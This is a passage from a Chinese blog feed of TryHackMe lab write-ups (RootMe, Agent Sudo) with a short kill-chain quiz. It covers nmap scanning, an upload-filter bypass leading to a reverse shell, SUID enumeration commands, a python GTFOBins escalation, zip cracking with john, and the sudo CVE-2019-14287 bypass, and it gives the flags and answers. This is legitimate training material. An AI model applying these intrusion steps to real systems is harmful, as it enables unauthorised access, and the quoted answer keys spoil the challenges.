class="line">攻击链的组成部分如下表所示。</span><br><span class="line"></span><br><span class="line">技术	目的	示例</span><br><span class="line">侦察	获取有关目标的信息	收集电子邮件、开放源情报</span><br><span class="line">武器化	将目标与漏洞结合。通常导致可交付的有效负载。	带后门的漏洞利用、恶意办公文档</span><br><span class="line">交付	如何将武器化功能交付给目标	电子邮件、网络、USB</span><br><span class="line">利用	利用目标系统执行代码	MS17-010，Zero-Logon等</span><br><span class="line">安装	安装恶意软件或其他工具	Mimikatz，Rubeus等</span><br><span class="line">命令和控制	从远程中央控制器控制被攻陷的资产	Empire，Cobalt Strike等</span><br><span class="line">目标行动	任何最终目标：勒索软件、数据外泄等	Conti，LockBit2.0等</span><br></pre></td></tr></table></figure>
<ol>
<li>
<p>If an adversary deployed Mimikatz on a target machine, where would they be placed in the Lockheed Martin cyber kill chain?</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Installation</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>What technique’s purpose is to exploit the target’s system to execute code?</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Exploitation</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="Overview-of-a-Red-Team-Engagement">Overview of a Red Team Engagement</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">我们讨论的所有内容在执行红队任务时都会结合在一起。为了更好地理解各组件和利益相关者是如何相互作用的，我们将分析一个简化的任务示例。点击绿色的“查看网站”按钮以继续。</span><br><span class="line"></span><br><span class="line">请注意，网络攻击链与该练习自然地相互契合：我们从侦察阶段开始，收集尽可能多的关于目标的情报，然后通过发送带有恶意附件的钓鱼邮件进行武器化和交付，接着是利用和安装阶段，使用本地漏洞提升BOB-PC上的权限，然后在受损主机上安装工具来转储密码哈希并执行横向移动，最后是目标行动，最终与我们的目标建立连接。</span><br></pre></td></tr></table></figure>
<h2 id="靶场：RootMe">靶场：RootMe</h2>
<h3 id="Reconnaissance">Reconnaissance</h3>
<ol>
<li>
<p>Scan the machine, how many ports are open?</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2</span><br></pre></td></tr></table></figure>
<p>nmap扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">─$ nmap -sV 10.10.24.147                </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-27 03:47 EST</span><br><span class="line">Nmap scan report for 10.10.24.147 (10.10.24.147)</span><br><span class="line">Host is up (0.29s latency).</span><br><span class="line">Not shown: 998 filtered tcp ports (no-response)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 39.87 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>What version of Apache is running?</p>
<p>根据上述扫描结果得出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2.4.29</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>What service is running on port 22?</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Find directories on the web server using the GoBuster tool</p>
<p><img src="https://s2.loli.net/2024/02/27/JAeXCag7i4V6nPt.png" alt="Tryhackme_4_1"></p>
</li>
<li>
<p>What is the hidden directory?</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/panel/</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="Getting-a-shell">Getting a shell</h3>
<p>在上面找到相关路径之后，是一个文件上传的入口，同时还有一个uploads，是上传文件的存放地址</p>
<p><img src="https://s2.loli.net/2024/02/27/CNL5VpRXo1xe3dy.png" alt="Tryhackme_4_2"></p>
<p>经测试仅对后缀名进行了过滤</p>
<p>通过后缀名加数字成功绕过，但是直接使用正向的连接失效，可能是禁了进口的流量，开始反弹shell</p>
<p>不知道什么缘故，kali虚拟机一直接受不到shell，主机上成功弹出来了，卡了好久，不知道什么原因（</p>
<p><img src="https://s2.loli.net/2024/02/27/DpksGFN39Htuigq.png" alt="Tryhackme_4_3"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ cd var/www</span><br><span class="line">$ ls</span><br><span class="line">html</span><br><span class="line">user.txt</span><br></pre></td></tr></table></figure>
<p>第一个shell的位置</p>
<h3 id="Privilege-escalation">Privilege escalation</h3>
<p>到了提权的位置。第一个提示说SUID提权</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; ;</span><br></pre></td></tr></table></figure>
<p>得到以下信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/snapd/snap-confine</span><br><span class="line">/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/policykit-1/polkit-agent-helper-1</span><br><span class="line">/usr/bin/traceroute6.iputils</span><br><span class="line">/usr/bin/newuidmap</span><br><span class="line">/usr/bin/newgidmap</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/python</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/snap/core/8268/bin/mount</span><br><span class="line">/snap/core/8268/bin/ping</span><br><span class="line">/snap/core/8268/bin/ping6</span><br><span class="line">/snap/core/8268/bin/su</span><br><span class="line">/snap/core/8268/bin/umount</span><br><span class="line">/snap/core/8268/usr/bin/chfn</span><br><span class="line">/snap/core/8268/usr/bin/chsh</span><br><span class="line">/snap/core/8268/usr/bin/gpasswd</span><br><span class="line">/snap/core/8268/usr/bin/newgrp</span><br><span class="line">/snap/core/8268/usr/bin/passwd</span><br><span class="line">/snap/core/8268/usr/bin/sudo</span><br><span class="line">/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/snap/core/8268/usr/lib/openssh/ssh-keysign</span><br><span class="line">/snap/core/8268/usr/lib/snapd/snap-confine</span><br><span class="line">/snap/core/8268/usr/sbin/pppd</span><br><span class="line">/snap/core/9665/bin/mount</span><br><span class="line">/snap/core/9665/bin/ping</span><br><span class="line">/snap/core/9665/bin/ping6</span><br><span class="line">/snap/core/9665/bin/su</span><br><span class="line">/snap/core/9665/bin/umount</span><br><span class="line">/snap/core/9665/usr/bin/chfn</span><br><span class="line">/snap/core/9665/usr/bin/chsh</span><br><span class="line">/snap/core/9665/usr/bin/gpasswd</span><br><span class="line">/snap/core/9665/usr/bin/newgrp</span><br><span class="line">/snap/core/9665/usr/bin/passwd</span><br><span class="line">/snap/core/9665/usr/bin/sudo</span><br><span class="line">/snap/core/9665/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/snap/core/9665/usr/lib/openssh/ssh-keysign</span><br><span class="line">/snap/core/9665/usr/lib/snapd/snap-confine</span><br><span class="line">/snap/core/9665/usr/sbin/pppd</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/su</span><br><span class="line">/bin/fusermount</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/umount</span><br></pre></td></tr></table></figure>
<p>这是靶机上的信息，我们需要找到异常，此此时尝试在自己主机上使用相同命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/bin/fusermount3</span><br><span class="line">/usr/bin/kismet_cap_hak5_wifi_coconut</span><br><span class="line">/usr/bin/kismet_cap_linux_bluetooth</span><br><span class="line">/usr/bin/netkit-rsh</span><br><span class="line">/usr/bin/ntfs-3g</span><br><span class="line">/usr/bin/kismet_cap_nxp_kw41z</span><br><span class="line">/usr/bin/kismet_cap_linux_wifi</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/kismet_cap_rz_killerbee</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/pkexec</span><br><span class="line">/usr/bin/netkit-rcp</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/kismet_cap_ti_cc_2540</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/kismet_cap_ti_cc_2531</span><br><span class="line">/usr/bin/kismet_cap_nrf_51822</span><br><span class="line">/usr/bin/kismet_cap_ubertooth_one</span><br><span class="line">/usr/bin/kismet_cap_nrf_52840</span><br><span class="line">/usr/bin/vmware-user-suid-wrapper</span><br><span class="line">/usr/bin/kismet_cap_nrf_mousejack</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/netkit-rlogin</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/sbin/mount.cifs</span><br><span class="line">/usr/sbin/mount.nfs</span><br><span class="line">/usr/sbin/pppd</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/polkit-1/polkit-agent-helper-1</span><br><span class="line">/usr/lib/xorg/Xorg.wrap</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>发现/usr/bin/python不应该存在</p>
<p><a href="https://gtfobins.github.io/gtfobins/python/#suid">python | GTFOBins</a></p>
<p>在这里找到相关的提权方式</p>
<p><img src="https://s2.loli.net/2024/02/27/tPw5OLoF8iXcBaA.png" alt="Tryhackme_4_4"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd root</span><br><span class="line">ls</span><br><span class="line">root.txt</span><br><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Tryhackme</category>
      </categories>
      <tags>
        <tag>Tryhackme</tag>
      </tags>
  </entry>
  <entry>
    <title>Tryhackme_Diary-5</title>
    <url>/2024/03/05/Tryhackme_Diary-5/</url>
    <content><![CDATA[<h1>Tryhackme_Diary-5</h1>
<h2 id="Agent-Sudo">Agent Sudo</h2>
<h3 id="Enumerate">Enumerate</h3>
<ol>
<li>
<p>How many open ports?</p>
<p>可能是因为网络延迟的问题，导致开始的时候一个端口都没扫描出来，延时可以适当开高一点点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/03/05/pV4LatyfSXNCl35.png" alt="Tryhackme_5_1"></p>
</li>
<li>
<p>How you redirect yourself to a secret page?</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user-agent</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/03/05/OlMXjakTzYwE74N.png" alt="Tryhackme_5_2"></p>
</li>
<li>
<p>What is the agent name?</p>
<p>user-agent参数为C的时候，可以收到回复</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Attention chris,</span><br><span class="line"></span><br><span class="line">Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!</span><br><span class="line"></span><br><span class="line">From,</span><br><span class="line">Agent R</span><br></pre></td></tr></table></figure>
<p>因此可以获取本题的答案是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chris</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="Hash-cracking-and-brute-force">Hash cracking and brute-force</h3>
<p>FTP password</p>
<ol>
<li>
<p>FTP password</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crystal</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/03/05/LI6Zid3JzXKVAYE.png" alt="Tryhackme_5_3"></p>
</li>
<li>
<p>Zip file password</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp&gt; ls</span><br><span class="line">229 Entering Extended Passive Mode (|||57590|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt</span><br><span class="line">-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg</span><br><span class="line">-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; mget *</span><br><span class="line">mget To_agentJ.txt [anpqy?]? y</span><br><span class="line">229 Entering Extended Passive Mode (|||37193|)</span><br><span class="line">150 Opening BINARY mode data connection for To_agentJ.txt (217 bytes).</span><br><span class="line">100% |*************************************************************************************************************|   217       53.09 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">217 bytes received in 00:00 (0.75 KiB/s)</span><br><span class="line">mget cute-alien.jpg [anpqy?]? y</span><br><span class="line">229 Entering Extended Passive Mode (|||42821|)</span><br><span class="line">150 Opening BINARY mode data connection for cute-alien.jpg (33143 bytes).</span><br><span class="line">100% |*************************************************************************************************************| 33143      113.24 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">33143 bytes received in 00:00 (57.12 KiB/s)</span><br><span class="line">mget cutie.png [anpqy?]? y</span><br><span class="line">229 Entering Extended Passive Mode (|||18497|)</span><br><span class="line">150 Opening BINARY mode data connection for cutie.png (34842 bytes).</span><br><span class="line">100% |*************************************************************************************************************| 34842       60.41 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">34842 bytes received in 00:00 (40.51 KiB/s)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ftp登录之后将文件进行下载，然后寻找相关线索</p>
<p>将图片分析后发现存在一个压缩包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ binwalk -e cutie.png</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced</span><br><span class="line">869           0x365           Zlib compressed data, best compression</span><br><span class="line"></span><br><span class="line">WARNING: Extractor.execute failed to run external extractor &#x27;jar xvf &#x27;%e&#x27;&#x27;: [Errno 2] No such file or directory: &#x27;jar&#x27;, &#x27;jar xvf &#x27;%e&#x27;&#x27; might not be installed correctly</span><br><span class="line">34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt</span><br><span class="line">34820         0x8804          End of Zip archive, footer length: 22</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>分离开后确实有密码，开始爆破</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面/_cutie.png.extracted]</span><br><span class="line">└─$ john hash                                             </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 AVX 4x])</span><br><span class="line">Cost 1 (HMAC size) is 78 for all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Proceeding with single, rules:Single</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">Almost done: Processing the remaining buffered candidate passwords, if any.</span><br><span class="line">Proceeding with wordlist:/usr/share/john/password.lst</span><br><span class="line">alien            (8702.zip/To_agentR.txt)     </span><br><span class="line">1g 0:00:00:00 DONE 2/3 (2024-03-05 01:33) 1.315g/s 58478p/s 58478c/s 58478C/s 123456..Peter</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>得到密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alien</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>steg password</p>
<p>解压上述压缩包后我们得到一段信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Agent C,</span><br><span class="line">We need to send the picture to &#x27;QXJlYTUx&#x27; as soon as possible!</span><br><span class="line">By,</span><br><span class="line">Agent R</span><br></pre></td></tr></table></figure>
<p>base64后得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Area51</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>Who is the other agent (in full name)?</p>
<p>从cute-alien.jpg中提取数据，然后得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hi james,</span><br><span class="line"></span><br><span class="line">Glad you find this message. Your login password is hackerrules!</span><br><span class="line"></span><br><span class="line">Don&#x27;t ask me why the password look cheesy, ask agent R who set this password for you.</span><br><span class="line"></span><br><span class="line">Your buddy,</span><br><span class="line">chris</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>SSH password</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hackerrules</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="Capture-the-user-flag">Capture the user flag</h3>
<ol>
<li>
<p>What is the user flag?</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ ^[[200~ssh james@10.10.212.207   ~</span><br><span class="line">zsh: bad pattern: ^[[200~ssh</span><br><span class="line">                                                                                                                                                          </span><br><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ ssh james@10.10.212.207   </span><br><span class="line">The authenticity of host &#x27;10.10.212.207 (10.10.212.207)&#x27; can&#x27;t be established.</span><br><span class="line">ED25519 key fingerprint is SHA256:rt6rNpPo1pGMkl4PRRE7NaQKAHV+UNkS9BfrCy8jVCA.</span><br><span class="line">This host key is known by the following other names/addresses:</span><br><span class="line">    ~/.ssh/known_hosts:1: [hashed name]</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;10.10.212.207&#x27; (ED25519) to the list of known hosts.</span><br><span class="line">james@10.10.212.207&#x27;s password: </span><br><span class="line">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-55-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line"> System information disabled due to load higher than 1.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">75 packages can be updated.</span><br><span class="line">33 updates are security updates.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Last login: Tue Oct 29 14:26:27 2019</span><br><span class="line">james@agent-sudo:~$ ls</span><br><span class="line">Alien_autospy.jpg  user_flag.txt</span><br><span class="line">james@agent-sudo:~$ cat user_flag.txt </span><br><span class="line">b03d975e8c92a7c04146cfa7a5a313c7</span><br></pre></td></tr></table></figure>
<p>因此可以得到本题的flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b03d975e8c92a7c04146cfa7a5a313c7</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>What is the incident of the photo called?</p>
<p>在该文件下还发现存在一个图片，传输至本地查看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo scp james@10.10.212.207:Alien_autospy.jpg ~/</span><br></pre></td></tr></table></figure>
<p>尝试传输发现权限不足</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sorry, user james is not allowed to execute &#x27;/usr/bin/scp james@10.10.212.207:Alien_autospy.jpg /home/james/&#x27; as root on agent-sudo.</span><br></pre></td></tr></table></figure>
<p>枚举一下权限组信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">james@agent-sudo:~$ sudo -l</span><br><span class="line">[sudo] password for james: </span><br><span class="line">Sorry, try again.</span><br><span class="line">[sudo] password for james: </span><br><span class="line">Matching Defaults entries for james on agent-sudo:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User james may run the following commands on agent-sudo:</span><br><span class="line">    (ALL, !root) /bin/bash</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>提权步骤看下面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Roswell alien autopsy</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="Privilege-escalation">Privilege escalation</h3>
<ol>
<li>
<p>CVE number for the escalation</p>
<p>查询关键词</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(ALL, !root) /bin/bash</span><br></pre></td></tr></table></figure>
<p>发现存在漏洞<a href="https://www.exploit-db.com/exploits/47502">sudo 1.8.27 - Security Bypass - Linux local Exploit (exploit-db.com)</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CVE-2019-14287</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>What is the root flag?</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@agent-sudo:/root# ls</span><br><span class="line">root.txt</span><br><span class="line">root@agent-sudo:/root# cat root.txt </span><br><span class="line">To Mr.hacker,</span><br><span class="line"></span><br><span class="line">Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. </span><br><span class="line"></span><br><span class="line">Your flag is </span><br><span class="line">b53a02f55b57d4439e3341834d70c062</span><br><span class="line"></span><br><span class="line">By,</span><br><span class="line">DesKel a.k.a Agent R</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>(Bonus) Who is Agent R?</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DesKel</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p><img src="https://s2.loli.net/2024/03/05/vhJLdnYr8VDmCqj.png" alt="Tryhackme_5_4"></p>
]]></content>
      <categories>
        <category>Tryhackme</category>
      </categories>
      <tags>
        <tag>Tryhackme</tag>
      </tags>
  </entry>
</search>
